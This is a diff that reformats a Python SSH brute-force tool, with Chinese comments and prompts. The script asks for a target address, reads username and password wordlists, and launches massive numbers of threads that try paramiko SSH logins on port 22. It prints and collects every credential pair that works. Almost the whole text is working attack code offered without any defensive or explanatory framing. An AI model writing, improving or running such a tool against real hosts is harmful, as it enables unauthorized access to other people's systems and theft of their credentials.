@@ -1,5 +1,6 @@
 import paramiko
 import threading
+
 threads = []  # 线程池
 thread_max = threading.BoundedSemaphore(1000000)
 
@@ -7,7 +8,7 @@ thread_max = threading.BoundedSemaphore(1000000)
 def sshbrute(user, passw, host):
     global work
     # 设置 flag 为 0 ，在成功登录的时候再置为 1
-    passw=str(passw)
+    passw = str(passw)
     try:
         # 使用 paramiko.SSHClient 创建 ssh 对象
         ssh = paramiko.SSHClient()
@@ -17,31 +18,31 @@ def sshbrute(user, passw, host):
         ssh.connect(hostname=host, port=22, username=user, password=passw, timeout=1)
         # 打印出成功登录的 用户名 和 密码
         print("login success! User:" + user, "Pass:" + passw)
-        work+="login success! User:" + user+"Pass:" + passw
+        work += "login success! User:" + user + "Pass:" + passw
     except:
         # 打印出 登录失败 的 用户名 和 密码
-        print("login failed!", "user:" + user, "pass:" + passw+'\n',end='')
+        print("login failed!", "user:" + user, "pass:" + passw + '\n', end='')
 
-def multi_ssh(tempuser,temppasswd,target):#多线程
-    userfile=tempuser.readlines()
+
+def multi_ssh(tempuser, temppasswd, target):  # 多线程
+    userfile = tempuser.readlines()
     passwdfile = temppasswd.readlines()
     for a in userfile:
         for i in passwdfile:
             thread_max.acquire()
-            t = threading.Thread(target=sshbrute, args=(a.replace('\n',''),i.replace('\n',''),target,))
+            t = threading.Thread(target=sshbrute, args=(a.replace('\n', ''), i.replace('\n', ''), target,))
             threads.append(t)
             t.start()
         for t in threads:
             t.join()
 
 
-
 def begin():
     global work
-    target=input(' 请输入需要ssh爆破的地址:')
-    tempuser=open('用户名.txt','r')
+    target = input(' 请输入需要ssh爆破的地址:')
+    tempuser = open('用户名.txt', 'r')
     temppasswd = open('密码库.txt', 'r')
-    multi_ssh(tempuser,temppasswd,target)
+    multi_ssh(tempuser, temppasswd, target)
     print(work)
 
 
@@ -49,6 +50,8 @@ work = ''
 '''对print加锁,防止输出混乱'''
 _print = print
 mutex = threading.Lock()
+
+
 def print(text, *args, **kw):
     with mutex:
         _print(text, *args, **kw)
